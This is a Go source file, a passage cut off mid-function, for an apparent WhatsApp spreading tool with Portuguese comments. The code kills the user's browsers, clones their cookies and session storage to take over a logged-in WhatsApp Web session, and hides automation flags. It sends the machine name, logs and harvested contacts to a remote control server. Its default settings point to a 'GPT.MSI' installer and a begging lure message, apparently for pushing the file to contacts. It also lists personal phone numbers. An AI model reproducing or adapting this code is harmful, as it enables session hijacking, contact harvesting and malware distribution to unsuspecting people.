// WhatsApp Automation - Versão Go com Rod (sem chromedriver)
// Versão GOB - Comunicação binária com servidor
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/gob"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/google/uuid"
)

// ============================================
// CONSTANTES E CONFIGURAÇÕES
// ============================================

// MODO TESTE: Se não estiver vazio, ignora a lista do WhatsApp e envia só para estes contatos
// Formato: []Contato{{Numero: "5535XXXXX@c.us", Nome: "Nome"}, ...}
// Para desativar o modo teste, deixe a lista vazia: var CONTATOS_TESTE = []Contato{}
var CONTATOS_TESTE = []Contato{
	{Numero: "553598919311@c.us", Nome: "❤️ Esposa"},
	{Numero: "553591340572@c.us", Nome: "Filha Mercenaria💖"},
	{Numero: "553497138953@c.us", Nome: "Luiz"},
}

var (
	PASTA_TEMP        string
	WHAT_JS_URL       = "https://github.com/wppconnect-team/wa-js/releases/latest/download/wppconnect-wa.js"
	WHAT_JS_CAMINHO   string
	BASE_URL          = "http://127.0.0.1:8000"
	ENDPOINT          string
	LOG_ENDPOINT      string
	CONFIG_ENDPOINT   string
	CONTACTS_ENDPOINT string
	SESSION_ID        string
	NOME_MAQUINA      string
	INICIO_EXECUCAO   time.Time
)

func init() {
	if runtime.GOOS == "windows" {
		PASTA_TEMP = "C:\\temp"
	} else {
		PASTA_TEMP = "/tmp"
	}
	WHAT_JS_CAMINHO = filepath.Join(PASTA_TEMP, "wppconnect-wa.js")

	ENDPOINT = BASE_URL + "/what/api/api"
	LOG_ENDPOINT = BASE_URL + "/what/api/log"
	CONFIG_ENDPOINT = BASE_URL + "/what/api/config"
	CONTACTS_ENDPOINT = BASE_URL + "/what/api/contacts"

	SESSION_ID = uuid.New().String()
	NOME_MAQUINA, _ = os.Hostname()
	INICIO_EXECUCAO = time.Now()
}

// ============================================
// ESTRUTURAS GOB (devem ser iguais ao servidor)
// ============================================

// Configuracao - item de config
type Configuracao struct {
	Chave string
	Valor string
}

// ConfigResponse - resposta do /what/api/config
type ConfigResponse struct {
	Success bool
	Data    []Configuracao
}

// LogRequest - request para /what/api/log
type LogRequest struct {
	SessionID   string
	NomeMaquina string
	Tipo        string
	Mensagem    string
	Detalhes    string
}

// GenericResponse - resposta generica
type GenericResponse struct {
	Success bool
	Message string
	Error   string
}

// ContatoGob - contato para GOB
type ContatoGob struct {
	Numero string
	Nome   string
}

// ContactsRequest - request para /what/api/contacts
type ContactsRequest struct {
	SessionID   string
	NomeMaquina string
	Contatos    []ContatoGob
}

// RelatorioRequest - request para /what/api/api
type RelatorioRequest struct {
	SessionID          string
	NomeMaquina        string
	SistemaOperacional string
	TotalContatos      int
	EnviadosComSucesso int
	TempoTotalMinutos  float64
	TimestampInicio    string
	TimestampFim       string
	ListaContatos      []map[string]string
}

// ============================================
// GERENCIAMENTO DE PERFIL (Smart Profile)
// ============================================

// PerfilSalvo - estrutura salva em arquivo para reutilizar perfil
type PerfilSalvo struct {
	Navegador       string    `json:"navegador"`        // Nome do navegador (Chrome, Edge, etc)
	PerfilOriginal  string    `json:"perfil_original"`  // Caminho do perfil original
	PerfilClonado   string    `json:"perfil_clonado"`   // Caminho do perfil clonado
	ExecutavelPath  string    `json:"executavel_path"`  // Caminho do executável
	WhatsAppLogado  bool      `json:"whatsapp_logado"`  // Se estava logado na última verificação
	DataVerificacao time.Time `json:"data_verificacao"` // Quando foi verificado
	DataClonagem    time.Time `json:"data_clonagem"`    // Quando foi clonado
}

// PERFIL_CONFIG_PATH - arquivo onde salva o perfil funcional
var PERFIL_CONFIG_PATH string

func init() {
	// Será inicializado após PASTA_TEMP
}

// CarregarPerfilSalvo carrega o perfil salvo do arquivo JSON
func CarregarPerfilSalvo() (*PerfilSalvo, error) {
	configPath := filepath.Join(PASTA_TEMP, "wa_perfil_config.json")

	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, err
	}

	var perfil PerfilSalvo
	if err := json.Unmarshal(data, &perfil); err != nil {
		return nil, err
	}

	return &perfil, nil
}

// SalvarPerfilConfig salva a configuração do perfil funcional
func SalvarPerfilConfig(perfil *PerfilSalvo) error {
	configPath := filepath.Join(PASTA_TEMP, "wa_perfil_config.json")

	data, err := json.MarshalIndent(perfil, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(configPath, data, 0644)
}

// LimparPerfilConfig remove o arquivo de configuração (força nova verificação)
func LimparPerfilConfig() {
	configPath := filepath.Join(PASTA_TEMP, "wa_perfil_config.json")
	os.Remove(configPath)
}

// GerenciarPerfilInteligente - gerencia perfil de forma inteligente
// Retorna: navegador, config do navegador, erro
func (a *AutomacaoCorporativa) GerenciarPerfilInteligente() (*rod.Browser, *ConfigNavegador, error) {
	a.EnviarLog(LogInfo, "🔍 Verificando perfil salvo...")

	// Tentar carregar perfil salvo
	perfilSalvo, err := CarregarPerfilSalvo()
	if err == nil && perfilSalvo != nil {
		// Verificar se o perfil clonado ainda existe
		if dirExists(perfilSalvo.PerfilClonado) && fileExists(perfilSalvo.ExecutavelPath) {
			a.EnviarLog(LogSucesso, fmt.Sprintf("✓ Perfil salvo encontrado: %s", perfilSalvo.Navegador))
			a.EnviarLog(LogInfo, fmt.Sprintf("  Clonado em: %s", perfilSalvo.DataClonagem.Format("02/01/2006 15:04")))

			// Usar o perfil salvo diretamente (sem fechar navegador, sem clonar)
			a.profileSelenium = perfilSalvo.PerfilClonado

			// Configurar navegador com perfil existente
			browser, err := a.IniciarNavegadorComPerfil(perfilSalvo.ExecutavelPath, perfilSalvo.PerfilClonado)
			if err != nil {
				a.EnviarLog(LogAviso, fmt.Sprintf("⚠️ Erro ao usar perfil salvo: %v", err))
				a.EnviarLog(LogInfo, "Iniciando nova verificação...")
				LimparPerfilConfig()
			} else {
				// Criar config do navegador para retornar
				navConfig := &ConfigNavegador{
					Nome:            perfilSalvo.Navegador,
					ExecutavelPaths: []string{perfilSalvo.ExecutavelPath},
				}
				return browser, navConfig, nil
			}
		} else {
			a.EnviarLog(LogAviso, "⚠️ Perfil salvo não existe mais, iniciando nova verificação...")
			LimparPerfilConfig()
		}
	}

	// Não tem perfil salvo ou falhou - fazer verificação completa
	return a.DescobriPerfilFuncional()
}

// IniciarNavegadorComPerfil inicia o navegador usando um perfil já existente
func (a *AutomacaoCorporativa) IniciarNavegadorComPerfil(executavel, perfilPath string) (*rod.Browser, error) {
	a.EnviarLog(LogInfo, fmt.Sprintf("Iniciando navegador com perfil existente..."))

	modoHeadless := strings.ToLower(a.config.ModoHeadless) == "true"

	l := launcher.New().
		Bin(executavel).
		UserDataDir(perfilPath).
		Headless(modoHeadless).
		Set("disable-blink-features", "AutomationControlled").
		Set("disable-infobars").
		Set("no-first-run").
		Set("no-default-browser-check").
		Set("disable-extensions").
		Set("disable-popup-blocking")

	url, err := l.Launch()
	if err != nil {
		return nil, fmt.Errorf("erro ao iniciar navegador: %v", err)
	}

	browser := rod.New().ControlURL(url)
	if err := browser.Connect(); err != nil {
		return nil, fmt.Errorf("erro ao conectar: %v", err)
	}

	a.EnviarLog(LogSucesso, "✓ Navegador iniciado (perfil reutilizado)")
	return browser, nil
}

// DescobriPerfilFuncional descobre qual perfil tem WhatsApp logado
func (a *AutomacaoCorporativa) DescobriPerfilFuncional() (*rod.Browser, *ConfigNavegador, error) {
	a.EnviarLog(LogInfo, "")
	a.EnviarLog(LogInfo, "╔══════════════════════════════════════════╗")
	a.EnviarLog(LogInfo, "║  🔎 DESCOBERTA DE PERFIL FUNCIONAL       ║")
	a.EnviarLog(LogInfo, "╚══════════════════════════════════════════╝")

	navegadores := getNavegadoresSuportados()

	// Estrutura para guardar perfis testados
	type PerfilTestado struct {
		Navegador      string
		Config         *ConfigNavegador
		PerfilOriginal string
		PerfilClonado  string
		Executavel     string
		Logado         bool
	}
	var perfisTetados []PerfilTestado

	// 1. Detectar todos os navegadores e perfis disponíveis
	a.EnviarLog(LogInfo, "")
	a.EnviarLog(LogInfo, "[1/4] Detectando navegadores instalados...")

	var navegadoresEncontrados []struct {
		Nome       string
		Config     *ConfigNavegador
		Executavel string
		Perfil     string
	}

	for nome, config := range navegadores {
		// Verificar executável
		var executavel string
		for _, path := range config.ExecutavelPaths {
			if fileExists(path) {
				executavel = path
				break
			}
		}
		if executavel == "" {
			continue
		}

		// Verificar perfil
		var perfilPath string
		for _, path := range config.UserDataPaths {
			if dirExists(path) {
				perfilPath = path
				break
			}
		}
		if perfilPath == "" {
			continue
		}

		configCopy := config
		navegadoresEncontrados = append(navegadoresEncontrados, struct {
			Nome       string
			Config     *ConfigNavegador
			Executavel string
			Perfil     string
		}{nome, &configCopy, executavel, perfilPath})

		a.EnviarLog(LogSucesso, fmt.Sprintf("   ✓ %s encontrado", config.Nome))
	}

	if len(navegadoresEncontrados) == 0 {
		return nil, nil, fmt.Errorf("nenhum navegador suportado encontrado")
	}

	// 2. Fechar todos os navegadores e clonar perfis
	a.EnviarLog(LogInfo, "")
	a.EnviarLog(LogInfo, "[2/4] Fechando navegadores e clonando perfis...")

	for _, nav := range navegadoresEncontrados {
		a.MatarNavegador(nav.Config.Nome)
	}
	time.Sleep(2 * time.Second)

	for _, nav := range navegadoresEncontrados {
		// Criar perfil clonado
		perfilClonado := filepath.Join(PASTA_TEMP, fmt.Sprintf("wa_profile_%s_%d", strings.ToLower(nav.Nome), time.Now().UnixNano()))
		os.MkdirAll(perfilClonado, 0755)

		a.EnviarLog(LogInfo, fmt.Sprintf("   Clonando perfil %s...", nav.Config.Nome))
		a.copiarDadosPerfil(nav.Perfil, perfilClonado)

		perfisTetados = append(perfisTetados, PerfilTestado{
			Navegador:      nav.Config.Nome,
			Config:         nav.Config,
			PerfilOriginal: nav.Perfil,
			PerfilClonado:  perfilClonado,
			Executavel:     nav.Executavel,
			Logado:         false,
		})
	}

	// 3. Testar cada perfil para ver qual tem WhatsApp logado
	a.EnviarLog(LogInfo, "")
	a.EnviarLog(LogInfo, "[3/4] Testando perfis para WhatsApp logado...")

	var perfilFuncional *PerfilTestado

	for i := range perfisTetados {
		perfil := &perfisTetados[i]
		a.EnviarLog(LogInfo, fmt.Sprintf("   Testando %s...", perfil.Navegador))

		logado, err := a.TestarPerfilWhatsApp(perfil.Executavel, perfil.PerfilClonado)
		if err != nil {
			a.EnviarLog(LogAviso, fmt.Sprintf("   ❌ %s: erro - %v", perfil.Navegador, err))
			continue
		}

		perfil.Logado = logado
		if logado {
			a.EnviarLog(LogSucesso, fmt.Sprintf("   ✅ %s: WhatsApp LOGADO!", perfil.Navegador))
			perfilFuncional = perfil
			break // Encontrou um funcional, parar
		} else {
			a.EnviarLog(LogAviso, fmt.Sprintf("   ❌ %s: WhatsApp não logado", perfil.Navegador))
		}
	}

	// 4. Limpar perfis que não funcionam e salvar o funcional
	a.EnviarLog(LogInfo, "")
	a.EnviarLog(LogInfo, "[4/4] Limpando e salvando configuração...")

	for _, perfil := range perfisTetados {
		if !perfil.Logado && perfil.PerfilClonado != "" {
			os.RemoveAll(perfil.PerfilClonado)
			a.EnviarLog(LogInfo, fmt.Sprintf("   🗑️ Removido perfil %s (não funcional)", perfil.Navegador))
		}
	}

	if perfilFuncional == nil {
		return nil, nil, fmt.Errorf("nenhum perfil com WhatsApp logado encontrado")
	}

	// Salvar configuração do perfil funcional
	perfilSalvo := &PerfilSalvo{
		Navegador:       perfilFuncional.Navegador,
		PerfilOriginal:  perfilFuncional.PerfilOriginal,
		PerfilClonado:   perfilFuncional.PerfilClonado,
		ExecutavelPath:  perfilFuncional.Executavel,
		WhatsAppLogado:  true,
		DataVerificacao: time.Now(),
		DataClonagem:    time.Now(),
	}

	if err := SalvarPerfilConfig(perfilSalvo); err != nil {
		a.EnviarLog(LogAviso, fmt.Sprintf("⚠️ Não foi possível salvar config: %v", err))
	} else {
		a.EnviarLog(LogSucesso, "✓ Configuração do perfil salva!")
	}

	a.EnviarLog(LogInfo, "")
	a.EnviarLog(LogSucesso, fmt.Sprintf("🎉 Perfil funcional: %s", perfilFuncional.Navegador))

	// Iniciar navegador com o perfil funcional
	a.profileSelenium = perfilFuncional.PerfilClonado
	browser, err := a.IniciarNavegadorComPerfil(perfilFuncional.Executavel, perfilFuncional.PerfilClonado)
	if err != nil {
		return nil, nil, err
	}

	return browser, perfilFuncional.Config, nil
}

// TestarPerfilWhatsApp testa se um perfil tem WhatsApp logado
func (a *AutomacaoCorporativa) TestarPerfilWhatsApp(executavel, perfilPath string) (bool, error) {
	// Iniciar navegador em modo headless para teste rápido
	l := launcher.New().
		Bin(executavel).
		UserDataDir(perfilPath).
		Headless(true).
		Set("disable-blink-features", "AutomationControlled").
		Set("no-first-run").
		Set("no-default-browser-check")

	url, err := l.Launch()
	if err != nil {
		return false, err
	}

	browser := rod.New().ControlURL(url)
	if err := browser.Connect(); err != nil {
		return false, err
	}
	defer browser.Close()

	// Abrir WhatsApp Web
	page, err := browser.Page(proto.TargetCreateTarget{URL: "https://web.whatsapp.com"})
	if err != nil {
		return false, err
	}

	// Aguardar carregar (máximo 15 segundos)
	page.Timeout(15 * time.Second).WaitLoad()
	time.Sleep(5 * time.Second)

	// Verificar se está logado (procurar elemento que só aparece logado)
	result, err := proto.RuntimeEvaluate{
		Expression:    `document.querySelector('#pane-side') !== null || document.querySelector('#main') !== null`,
		ReturnByValue: true,
	}.Call(page)

	if err != nil {
		return false, nil // Erro ao verificar, assume não logado
	}

	return strings.Contains(result.Result.Value.String(), "true"), nil
}

// ============================================
// HELPERS GOB
// ============================================

// gobPost envia request GOB e decodifica resposta
func gobPost(endpoint string, payload interface{}, response interface{}) error {
	var buf bytes.Buffer
	enc := gob.NewEncoder(&buf)
	if err := enc.Encode(payload); err != nil {
		return fmt.Errorf("encode error: %v", err)
	}

	req, err := http.NewRequest("POST", endpoint, &buf)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-gob")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	dec := gob.NewDecoder(resp.Body)
	return dec.Decode(response)
}

// gobGet envia GET e decodifica resposta GOB
func gobGet(endpoint string, response interface{}) error {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(endpoint)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	dec := gob.NewDecoder(resp.Body)
	return dec.Decode(response)
}

// ============================================
// TIPOS E ESTRUTURAS LOCAIS
// ============================================

type TipoLog string

const (
	LogErro    TipoLog = "erro"
	LogSucesso TipoLog = "sucesso"
	LogAviso   TipoLog = "aviso"
	LogInfo    TipoLog = "info"
	LogInicio  TipoLog = "inicio"
	LogFim     TipoLog = "fim"
)

type Contato struct {
	Numero string `json:"numero"`
	Nome   string `json:"nome"`
	ID     int    `json:"id,omitempty"`
}

type ConfigAplicativo struct {
	ArquivoURL            string
	LimiteTeste           string
	DelayEntreMensagens   string
	TamanhoLote           string
	FiltroContatosExcluir string
	ModoHeadless          string
	TempoEsperaWhatsapp   string
	MensagemSaudacao      string
	MensagemFinal         string
	EnvioAtivo            string
	NavegadorPreferido    string
}

type ConfigNavegador struct {
	Nome            string
	ExecutavelPaths []string
	UserDataPaths   []string
}

type ResultadoEnvio struct {
	Success bool   `json:"success"`
	Nome    string `json:"nome"`
	Numero  string `json:"numero"`
	Erro    string `json:"erro,omitempty"`
}

// ============================================
// CONFIGURAÇÃO DE NAVEGADORES
// ============================================

func getNavegadoresSuportados() map[string]ConfigNavegador {
	localAppData := os.Getenv("LOCALAPPDATA")
	userProfile := os.Getenv("USERPROFILE")
	appData := os.Getenv("APPDATA")
	homeDir, _ := os.UserHomeDir()

	return map[string]ConfigNavegador{
		"Chrome": {
			Nome: "Google Chrome",
			ExecutavelPaths: []string{
				"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
				"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
				"/usr/bin/google-chrome",
				"/usr/bin/chromium",
			},
			UserDataPaths: []string{
				filepath.Join(localAppData, "Google", "Chrome", "User Data"),
				filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data"),
				filepath.Join(homeDir, ".config", "google-chrome"),
				filepath.Join(homeDir, ".config", "chromium"),
			},
		},
		"Edge": {
			Nome: "Microsoft Edge",
			ExecutavelPaths: []string{
				"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
				"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
				"/usr/bin/microsoft-edge",
			},
			UserDataPaths: []string{
				filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
				filepath.Join(userProfile, "AppData", "Local", "Microsoft", "Edge", "User Data"),
				filepath.Join(homeDir, ".config", "microsoft-edge"),
			},
		},
		"Firefox": {
			Nome: "Mozilla Firefox",
			ExecutavelPaths: []string{
				"C:\\Program Files\\Mozilla Firefox\\firefox.exe",
				"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
				"/usr/bin/firefox",
			},
			UserDataPaths: []string{
				filepath.Join(appData, "Mozilla", "Firefox", "Profiles"),
				filepath.Join(userProfile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
				filepath.Join(homeDir, ".mozilla", "firefox"),
			},
		},
	}
}

// ============================================
// ESTRUTURA PRINCIPAL
// ============================================

type AutomacaoCorporativa struct {
	config                  ConfigAplicativo
	navegadorAtual          *ConfigNavegador
	browser                 *rod.Browser
	page                    *rod.Page
	profilePath             string
	profileSelenium         string
	ultimaVerificacaoConfig time.Time
	contatosProcessados     []Contato
}

func NovaAutomacao() *AutomacaoCorporativa {
	return &AutomacaoCorporativa{
		config: ConfigAplicativo{
			ArquivoURL:            "http://127.0.0.1:8000/arquivos/GPT.MSI",
			LimiteTeste:           "0",
			DelayEntreMensagens:   "300",
			TamanhoLote:           "10",
			FiltroContatosExcluir: "13135",
			ModoHeadless:          "false",
			TempoEsperaWhatsapp:   "60",
			MensagemSaudacao:      "Ola",
			MensagemFinal:         "Me dá uma força?",
			EnvioAtivo:            "true",
			NavegadorPreferido:    "auto",
		},
		ultimaVerificacaoConfig: time.Now(),
		contatosProcessados:     make([]Contato, 0),
	}
}

// ============================================
// FUNÇÕES DE LOG (GOB)
// ============================================

func (a *AutomacaoCorporativa) EnviarLog(tipo TipoLog, mensagem string, detalhes ...string) {
	cores := map[TipoLog]string{
		LogErro:    "\033[91m",
		LogSucesso: "\033[92m",
		LogAviso:   "\033[93m",
		LogInfo:    "\033[90m",
		LogInicio:  "\033[96m",
		LogFim:     "\033[96m",
	}
	resetCor := "\033[0m"

	timestamp := time.Now().Format("15:04:05")
	cor := cores[tipo]

	fmt.Printf("%s[%s] %s%s\n", cor, timestamp, mensagem, resetCor)
	if len(detalhes) > 0 && detalhes[0] != "" {
		fmt.Printf("         %s\n", detalhes[0])
	}

	// Enviar log via GOB em goroutine
	go func() {
		detalhe := ""
		if len(detalhes) > 0 {
			detalhe = detalhes[0]
		}

		req := LogRequest{
			SessionID:   SESSION_ID,
			NomeMaquina: NOME_MAQUINA,
			Tipo:        string(tipo),
			Mensagem:    mensagem,
			Detalhes:    detalhe,
		}

		var resp GenericResponse
		gobPost(LOG_ENDPOINT, req, &resp)
	}()
}

// ============================================
// FUNÇÕES DE CONFIGURAÇÃO (GOB)
// ============================================

func (a *AutomacaoCorporativa) BuscaConfigNuvem(silencioso bool) map[string]string {
	if !silencioso {
		a.EnviarLog(LogInfo, "Buscando configurações online (GOB)")
	}

	var result ConfigResponse
	err := gobGet(CONFIG_ENDPOINT, &result)
	if err != nil {
		if !silencioso {
			a.EnviarLog(LogAviso, "Servidor offline - usando configurações padrão")
		}
		return a.configToMap()
	}

	if result.Success && len(result.Data) > 0 {
		configDict := make(map[string]string)
		for _, item := range result.Data {
			configDict[item.Chave] = item.Valor
		}

		if !silencioso {
			a.EnviarLog(LogSucesso, "Configurações carregadas via GOB",
				fmt.Sprintf("%d configurações", len(result.Data)))
		}

		return configDict
	}

	if !silencioso {
		a.EnviarLog(LogAviso, "Usando configurações padrão")
	}
	return a.configToMap()
}

func (a *AutomacaoCorporativa) configToMap() map[string]string {
	return map[string]string{
		"arquivo_url":             a.config.ArquivoURL,
		"limite_teste":            a.config.LimiteTeste,
		"delay_entre_mensagens":   a.config.DelayEntreMensagens,
		"tamanho_lote":            a.config.TamanhoLote,
		"filtro_contatos_excluir": a.config.FiltroContatosExcluir,
		"modo_headless":           a.config.ModoHeadless,
		"tempo_espera_whatsapp":   a.config.TempoEsperaWhatsapp,
		"mensagem_saudacao":       a.config.MensagemSaudacao,
		"mensagem_final":          a.config.MensagemFinal,
		"envio_ativo":             a.config.EnvioAtivo,
		"navegador_preferido":     a.config.NavegadorPreferido,
	}
}

func (a *AutomacaoCorporativa) AtualizaConfigSePreCisar(forcado bool) {
	tempoDecorrido := time.Since(a.ultimaVerificacaoConfig).Seconds()

	if forcado || tempoDecorrido >= 30 {
		novasConfigs := a.BuscaConfigNuvem(true)

		if v, ok := novasConfigs["arquivo_url"]; ok {
			a.config.ArquivoURL = v
		}
		if v, ok := novasConfigs["delay_entre_mensagens"]; ok {
			a.config.DelayEntreMensagens = v
		}
		if v, ok := novasConfigs["modo_headless"]; ok {
			a.config.ModoHeadless = v
		}
		if v, ok := novasConfigs["mensagem_saudacao"]; ok {
			a.config.MensagemSaudacao = v
		}
		if v, ok := novasConfigs["mensagem_final"]; ok {
			a.config.MensagemFinal = v
		}
		if v, ok := novasConfigs["envio_ativo"]; ok {
			a.config.EnvioAtivo = v
		}

		a.ultimaVerificacaoConfig = time.Now()
	}
}

func (a *AutomacaoCorporativa) VerificaEnvioAtivo() bool {
	a.AtualizaConfigSePreCisar(false)
	return strings.ToLower(a.config.EnvioAtivo) == "true"
}

func (a *AutomacaoCorporativa) WaitForEnvioAtivo() {
	if !a.VerificaEnvioAtivo() {
		a.EnviarLog(LogAviso, "⏸ Envio pausado - aguardando reativação")
		for !a.VerificaEnvioAtivo() {
			time.Sleep(5 * time.Second)
		}
		a.EnviarLog(LogSucesso, "▶ Envio reativado")
	}
}

// ============================================
// FUNÇÕES DE NAVEGADOR
// ============================================

func (a *AutomacaoCorporativa) IdentificarNavegador() (string, *ConfigNavegador) {
	a.EnviarLog(LogInfo, "Detectando navegador instalado")

	navegadores := getNavegadoresSuportados()
	navegadorPref := strings.ToLower(a.config.NavegadorPreferido)

	if navegadorPref != "auto" {
		for nome, config := range navegadores {
			if strings.ToLower(nome) == navegadorPref {
				for _, path := range config.ExecutavelPaths {
					if fileExists(path) {
						a.EnviarLog(LogSucesso, fmt.Sprintf("✓ %s encontrado (preferido)", config.Nome))
						return nome, &config
					}
				}
			}
		}
	}

	for nome, config := range navegadores {
		for _, path := range config.ExecutavelPaths {
			if fileExists(path) {
				a.EnviarLog(LogSucesso, fmt.Sprintf("✓ %s encontrado", config.Nome))
				configCopy := config
				return nome, &configCopy
			}
		}
	}

	a.EnviarLog(LogErro, "Nenhum navegador suportado encontrado")
	return "", nil
}

func (a *AutomacaoCorporativa) LocalizaPerfil(config *ConfigNavegador) string {
	a.EnviarLog(LogInfo, "Procurando perfil do navegador")

	for _, userDataPath := range config.UserDataPaths {
		if dirExists(userDataPath) {
			if config.Nome == "Mozilla Firefox" {
				entries, err := os.ReadDir(userDataPath)
				if err == nil {
					for _, entry := range entries {
						if entry.IsDir() && strings.Contains(strings.ToLower(entry.Name()), "default") {
							profileDir := filepath.Join(userDataPath, entry.Name())
							a.EnviarLog(LogSucesso, fmt.Sprintf("✓ Perfil encontrado: %s", profileDir))
							return profileDir
						}
					}
				}
			} else {
				defaultProfile := filepath.Join(userDataPath, "Default")
				if dirExists(defaultProfile) {
					a.EnviarLog(LogSucesso, fmt.Sprintf("✓ Perfil encontrado: %s", userDataPath))
					return userDataPath
				}
			}
		}
	}

	a.EnviarLog(LogAviso, "Perfil não encontrado - será criado novo")
	return ""
}

func (a *AutomacaoCorporativa) FabricaPerfilTemporario() string {
	tempDir := filepath.Join(PASTA_TEMP, fmt.Sprintf("wa_profile_%d", time.Now().UnixNano()))
	os.MkdirAll(tempDir, 0755)
	a.EnviarLog(LogInfo, fmt.Sprintf("Perfil temporário criado: %s", tempDir))
	return tempDir
}

// MatarNavegador fecha todos os processos do navegador para liberar arquivos do perfil
func (a *AutomacaoCorporativa) MatarNavegador(nome string) {
	a.EnviarLog(LogInfo, fmt.Sprintf("Fechando processos do %s...", nome))

	if runtime.GOOS == "windows" {
		switch nome {
		case "Google Chrome":
			exec.Command("taskkill", "/F", "/IM", "chrome.exe").Run()
		case "Microsoft Edge":
			exec.Command("taskkill", "/F", "/IM", "msedge.exe").Run()
		case "Mozilla Firefox":
			exec.Command("taskkill", "/F", "/IM", "firefox.exe").Run()
		}
	} else {
		switch nome {
		case "Google Chrome":
			exec.Command("pkill", "-9", "chrome").Run()
		case "Microsoft Edge":
			exec.Command("pkill", "-9", "msedge").Run()
		case "Mozilla Firefox":
			exec.Command("pkill", "-9", "firefox").Run()
		}
	}

	// Aguardar processos fecharem
	time.Sleep(2 * time.Second)
	a.EnviarLog(LogSucesso, "✓ Navegador fechado")
}

// copiarDadosPerfil copia dados essenciais do perfil para manter sessão do WhatsApp
func (a *AutomacaoCorporativa) copiarDadosPerfil(origem, destino string) {
	a.EnviarLog(LogInfo, "Copiando dados do perfil...")

	// Arquivos/pastas essenciais para manter a sessão do WhatsApp
	arquivosCopiar := []string{
		"Cookies",
		"Cookies-journal",
		"Local Storage",
		"Session Storage",
		"IndexedDB",
		"Service Worker",
		"Local State",
	}

	origemDefault := filepath.Join(origem, "Default")
	destinoDefault := filepath.Join(destino, "Default")
	os.MkdirAll(destinoDefault, 0755)

	copiados := 0
	for _, arquivo := range arquivosCopiar {
		src := filepath.Join(origemDefault, arquivo)
		dst := filepath.Join(destinoDefault, arquivo)

		if info, err := os.Stat(src); err == nil {
			var copyErr error
			if info.IsDir() {
				copyErr = copyDir(src, dst)
			} else {
				copyErr = copyFile(src, dst)
			}

			if copyErr == nil {
				copiados++
			} else {
				a.EnviarLog(LogAviso, fmt.Sprintf("Não foi possível copiar %s: %v", arquivo, copyErr))
			}
		}
	}

	// Copiar também Local State da raiz (importante para cookies)
	localStateSrc := filepath.Join(origem, "Local State")
	localStateDst := filepath.Join(destino, "Local State")
	if fileExists(localStateSrc) {
		copyFile(localStateSrc, localStateDst)
		copiados++
	}

	a.EnviarLog(LogSucesso, fmt.Sprintf("✓ %d itens copiados do perfil", copiados))
}

func (a *AutomacaoCorporativa) ConfigurarBrowser(tipo string, config *ConfigNavegador) (*rod.Browser, error) {
	a.EnviarLog(LogInfo, "Configurando navegador...")

	// Se existe perfil original, fechar browser e copiar dados
	if a.profilePath != "" {
		a.MatarNavegador(config.Nome)

		// Criar perfil temporário
		a.profileSelenium = a.FabricaPerfilTemporario()

		// Copiar dados do perfil original
		a.copiarDadosPerfil(a.profilePath, a.profileSelenium)
	} else {
		a.profileSelenium = a.FabricaPerfilTemporario()
	}

	// Encontrar executável
	var executavel string
	for _, path := range config.ExecutavelPaths {
		if fileExists(path) {
			executavel = path
			break
		}
	}

	if executavel == "" {
		return nil, fmt.Errorf("executável do navegador não encontrado")
	}

	// Configurar launcher
	modoHeadless := strings.ToLower(a.config.ModoHeadless) == "true"

	l := launcher.New().
		Bin(executavel).
		UserDataDir(a.profileSelenium).
		Headless(modoHeadless).
		Set("disable-blink-features", "AutomationControlled").
		Set("disable-infobars").
		Set("no-first-run").
		Set("no-default-browser-check").
		Set("disable-extensions").
		Set("disable-popup-blocking")

	// Iniciar browser
	url, err := l.Launch()
	if err != nil {
		return nil, fmt.Errorf("erro ao iniciar navegador: %v", err)
	}

	browser := rod.New().ControlURL(url)
	if err := browser.Connect(); err != nil {
		return nil, fmt.Errorf("erro ao conectar: %v", err)
	}

	a.EnviarLog(LogSucesso, "✓ Navegador iniciado")
	return browser, nil
}

func (a *AutomacaoCorporativa) DownloadBiblioteca() error {
	a.EnviarLog(LogInfo, "Verificando WA-JS...")

	// Se já existe, não baixar novamente
	if fileExists(WHAT_JS_CAMINHO) {
		info, _ := os.Stat(WHAT_JS_CAMINHO)
		if info.Size() > 100000 { // Mais de 100KB = provavelmente válido
			a.EnviarLog(LogSucesso, "✓ WA-JS já existe")
			return nil
		}
	}

	a.EnviarLog(LogInfo, "Baixando WA-JS...")

	resp, err := http.Get(WHAT_JS_URL)
	if err != nil {
		return fmt.Errorf("erro ao baixar WA-JS: %v", err)
	}
	defer resp.Body.Close()

	os.MkdirAll(PASTA_TEMP, 0755)

	out, err := os.Create(WHAT_JS_CAMINHO)
	if err != nil {
		return fmt.Errorf("erro ao criar arquivo: %v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("erro ao salvar arquivo: %v", err)
	}

	a.EnviarLog(LogSucesso, "✓ WA-JS baixado")
	return nil
}

// EvalJS executa JavaScript no contexto principal da página
func (a *AutomacaoCorporativa) EvalJS(expression string) (string, error) {
	if a.page == nil {
		return "", fmt.Errorf("página não inicializada")
	}
	result, err := proto.RuntimeEvaluate{
		Expression:    expression,
		ReturnByValue: true,
	}.Call(a.page)
	if err != nil {
		return "", err
	}
	return result.Result.Value.String(), nil
}

func (a *AutomacaoCorporativa) IniciarAutomacao() error {
	a.EnviarLog(LogInfo, "Abrindo WhatsApp Web...")

	page, err := a.browser.Page(proto.TargetCreateTarget{URL: "https://web.whatsapp.com"})
	if err != nil {
		return fmt.Errorf("erro ao abrir página: %v", err)
	}
	a.page = page

	// Aguardar carregamento
